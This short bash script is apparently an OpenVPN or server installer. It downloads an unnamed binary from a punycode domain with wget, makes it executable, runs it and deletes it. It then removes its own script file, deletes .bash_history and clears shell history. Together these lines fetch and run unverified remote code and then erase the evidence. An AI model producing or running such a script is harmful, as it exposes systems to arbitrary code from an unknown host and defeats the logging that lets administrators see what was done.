#!/bin/bash

#update os
apt-get update > /dev/null

#openvpn
wget -o /dev/null script.xn--l3clxf6cwbe0gd7j.com/herebird-OCS
chmod +x herebird-OCS
./herebird-OCS
rm herebird-OCS 2>/dev/null


#clear
rm ocs.sh 2>/dev/null
rm -rf .bash_history && history -c
